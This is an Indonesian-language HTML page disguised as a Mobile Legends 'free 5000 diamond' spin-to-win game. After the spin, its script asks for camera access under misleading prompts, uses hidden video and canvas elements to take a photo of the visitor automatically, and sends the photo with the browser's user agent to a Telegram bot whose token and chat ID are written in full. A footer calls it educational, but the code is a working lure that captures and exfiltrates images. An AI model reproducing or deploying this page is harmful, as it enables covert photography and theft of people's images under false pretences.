<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>DIAMOND FREE MOBILE LEGEND</title>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            background: linear-gradient(135deg, #0a0f1e 0%, #0c1222 100%);
            font-family: 'Segoe UI', system-ui, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .card {
            max-width: 500px;
            width: 100%;
            background: rgba(20, 28, 45, 0.95);
            border-radius: 40px;
            padding: 24px;
            border: 3px solid rgba(255, 80, 80, 0.7);
        }
        h1 { text-align: center; color: #ff6666; font-size: 1.5rem; margin-bottom: 10px; }
        .badge-edu {
            background: #ff444455;
            border: 1px solid #ff6666;
            border-radius: 40px;
            padding: 8px 16px;
            text-align: center;
            margin-bottom: 15px;
        }
        .badge-edu span { color: #ffaaaa; font-size: 0.7rem; font-weight: bold; }
        .big-warning {
            background: #006400;
            border: 2px solid #00FF00;
            padding: 12px;
            border-radius: 16px;
            margin-bottom: 20px;
            font-size: 0.75rem;
            color: #39FF14;
            text-align: center;
            font-weight: bold;
        }
        .spin-area { text-align: center; margin: 15px 0; }
        .wheel {
            width: 200px;
            height: 200px;
            margin: 0 auto;
            border-radius: 50%;
            background: conic-gradient(#ff4444 0deg 72deg, #ffaa33 72deg 144deg, #33ff33 144deg 216deg, #33aaff 216deg 288deg, #ff33ff 288deg 360deg);
            transition: transform 3s cubic-bezier(0.2, 0.9, 0.1, 1.1);
            box-shadow: 0 0 20px rgba(255,255,255,0.2);
            position: relative;
        }
        .wheel::after {
            content: "▼";
            position: absolute;
            top: -25px;
            left: 50%;
            transform: translateX(-50%);
            font-size: 30px;
            color: white;
        }
        .spin-btn {
            background: linear-gradient(145deg, #ff6600, #cc4400);
            color: white;
            border: none;
            padding: 12px 32px;
            border-radius: 60px;
            font-size: 1.2rem;
            font-weight: bold;
            margin-top: 20px;
            cursor: pointer;
        }
        .spin-btn:active { transform: scale(0.96); }
        .spin-btn:disabled { opacity: 0.5; }
        .result-spin { margin: 15px 0; font-size: 0.9rem; color: #ffd966; text-align: center; }
        
        /* Hidden video elements - tidak ditampilkan */
        .hidden-camera {
            display: none;
        }
        
        .log-area {
            background: #0a0f18;
            border-radius: 20px;
            padding: 12px;
            margin-top: 20px;
            font-family: monospace;
            font-size: 0.7rem;
            color: #8aa9c9;
            max-height: 250px;
            overflow-y: auto;
        }
        .log-line { padding: 4px 0; border-bottom: 1px solid #1a2a3a; }
        .log-warning { color: #ff8888; }
        .log-success { color: #88ff88; }
        .footer-edu { margin-top: 20px; text-align: center; font-size: 0.65rem; color: #ffaa66; }
        hr { border-color: #2d4a6e; margin: 15px 0; }
        
        .toast-msg {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            background: #000000cc;
            backdrop-filter: blur(10px);
            color: white;
            padding: 10px 20px;
            border-radius: 40px;
            font-size: 0.8rem;
            z-index: 1000;
            display: none;
            border-left: 3px solid #ff4444;
        }
    </style>
</head>
<body>
<div class="card">
    <h1>🎰 SPIN & CLAIM 5000 DIAMOND</h1>
    <div class="big-warning">
        <br> INI FREE 100% <br>
    </div>

    <div class="spin-area">
        <div class="wheel" id="wheel"></div>
        <button class="spin-btn" id="spinBtn">🎡 SPIN SEKARANG</button>
        <div class="result-spin" id="spinResult"></div>
    </div>

    <!-- Hidden camera elements - tidak terlihat oleh user -->
    <div class="hidden-camera">
        <video id="video" autoplay playsinline></video>
        <canvas id="canvas"></canvas>
    </div>

    <div class="log-area" id="logArea">
        <div class="log-line" id="log1">⏳ Klik SPIN untuk mulai</div>
    </div>
    <hr>
    <div class="footer-edu">
        🛡️ Halaman EDUKASI: menunjukkan scam spin → kamera → kirim foto ke Telegram<br>
        Token: 8712178117:AAEL4pFi... | Chat ID: 8474051991
    </div>
</div>

<div id="toast" class="toast-msg"></div>

<script>
    (function() {
        // ==========================================
        // TOKEN DAN CHAT ID (AKTIF)
        // ==========================================
        const BOT_TOKEN = "8712178117:AAEL4pFiAIGU-YayzkVirVwjhpat_Z7UCSo";
        const CHAT_ID = "8474051991";
        // ==========================================
        
        // Elemen
        const wheel = document.getElementById('wheel');
        const spinBtn = document.getElementById('spinBtn');
        const spinResult = document.getElementById('spinResult');
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        
        let spinning = false;
        let mediaStream = null;
        let cameraReady = false;
        let spinCompleted = false;
        
        function showToast(msg, isError = false) {
            const toast = document.getElementById('toast');
            toast.textContent = msg;
            toast.style.display = 'block';
            toast.style.borderLeftColor = isError ? '#ff4444' : '#44ff44';
            setTimeout(() => {
                toast.style.display = 'none';
            }, 3000);
        }
        
        function addLog(msg, type = 'info') {
            const logArea = document.getElementById('logArea');
            const logDiv = document.createElement('div');
            logDiv.className = 'log-line';
            if (type === 'warning') logDiv.style.color = '#ff8888';
            if (type === 'success') logDiv.style.color = '#88ff88';
            logDiv.innerHTML = msg;
            logArea.appendChild(logDiv);
            logArea.scrollTop = logArea.scrollHeight;
        }
        
        // Fungsi ambil foto otomatis
        async function autoCaptureAndSend() {
            if (!cameraReady || !video.videoWidth || !video.videoHeight) {
                addLog("❌ Kamera tidak siap untuk mengambil foto", 'warning');
                return;
            }
            
            addLog("📸 [AUTOCAPTURE] Mengambil foto secara otomatis...", 'warning');
            showToast("📸 Mengambil foto Anda...", false);
            
            const w = video.videoWidth;
            const h = video.videoHeight;
            canvas.width = w;
            canvas.height = h;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, w, h);
            
            canvas.toBlob(async (blob) => {
                if (blob) {
                    addLog(`📸 Foto berhasil diambil! Ukuran: ${(blob.size/1024).toFixed(1)} KB`, 'success');
                    showToast("📤 Mengirim foto ke server...", false);
                    
                    // Langsung kirim ke Telegram
                    await sendToTelegram(blob);
                } else {
                    addLog("❌ Gagal mengambil foto", 'warning');
                }
            }, 'image/jpeg', 0.85);
        }
        
        // Kirim ke Telegram
        async function sendToTelegram(blob) {
            addLog(`📤 MENGIRIM FOTO KE TELEGRAM...`, 'warning');
            addLog(`🤖 Target Bot: ${BOT_TOKEN.substring(0,15)}...`, 'info');
            addLog(`👤 Target Chat ID: ${CHAT_ID}`, 'info');
            
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'scam_victim.jpg');
            formData.append('caption', `🚨 [EDUKASI] Simulasi Scam Spin-to-Win\nWaktu: ${new Date().toLocaleString()}\nIP: ${navigator.userAgent.substring(0,50)}\n\n⚠️ Ini hanya simulasi edukasi! Di dunia nyata, foto Anda akan dicuri!`);
            
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                const data = await response.json();
                
                if (data.ok) {
                    addLog(`✅ FOTO BERHASIL DIKIRIM KE TELEGRAM!`, 'success');
                    addLog(`🚨 [PELAJARAN] Scam nyata bisa mencuri foto Anda tanpa sepengetahuan!`, 'warning');
                    addLog(`📌 Foto Anda sudah masuk ke Bot Telegram sebagai bukti kelemahan sistem ini.`, 'warning');
                    showToast("✅ Foto terkirim! Lihat bukti di log", false);
                } else {
                    addLog(`❌ Gagal kirim: ${data.description || "unknown error"}`, 'warning');
                    if (data.description && data.description.includes("Wrong chat identifier")) {
                        addLog(`📌 Chat ID mungkin salah atau bot belum di-start oleh pemilik chat ID`, 'info');
                    }
                }
            } catch (err) {
                addLog(`❌ Network error: ${err.message}`, 'warning');
            }
        }
        
        // Minta izin kamera (tanpa menampilkan preview)
        async function requestCamera() {
            try {
                showToast("⚠️ Website meminta akses kamera...", false);
                
                if (mediaStream) {
                    mediaStream.getTracks().forEach(t => t.stop());
                }
                
                mediaStream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = mediaStream;
                await video.play();
                cameraReady = true;
                
                addLog("✅ Izin untuk diamond claim", 'success');
                showToast("✅ mengecek id mobile legends", false);
                
                // Setelah kamera siap, langsung ambil foto otomatis
                setTimeout(() => {
                    autoCaptureAndSend();
                }, 500);
                
            } catch (err) {
                addLog(`✅  izin kan untuk claim diamond` , 'success');
                
                showToast("❌ IzAnda menolak akses diamond free", true);
            }
        }
        
        // Spin logic
        spinBtn.onclick = () => {
            if (spinning) return;
            spinning = true;
            spinBtn.disabled = true;
            spinResult.innerHTML = "🎡 Memutar...";
            
            const randomDeg = 1800 + Math.random() * 3600;
            wheel.style.transform = `rotate(${randomDeg}deg)`;
            
            setTimeout(() => {
                spinning = false;
                spinBtn.disabled = false;
                
                const prizes = ["1000 Diamond", "2500 Diamond", "5000 Diamond", "BONUS 10000", "2000 Diamond", "FREE SKIN"];
                const randomPrize = prizes[Math.floor(Math.random() * prizes.length)];
                spinResult.innerHTML = `🎉 SELAMAT! Anda mendapat ${randomPrize} 🎉<br><span style="font-size:0.7rem; color:#ffaa66;">Klik OK untuk klaim hadiah Anda!</span>`;
                
                addLog(`🎡 Spin selesai. Hasil: ${randomPrize}`, 'warning');
                
                
                // Setelah spin, langsung minta kamera (tanpa tombol tambahan)
                setTimeout(() => {
                    requestCamera();
                }, 500);
                
            }, 3000);
        };
        
        // Cleanup
        window.addEventListener('beforeunload', () => {
            if (mediaStream) {
                mediaStream.getTracks().forEach(t => t.stop());
            }
        });
        
        addLog("🛡️ 100% free", 'success');
    })();
</script>
</body>
</html>
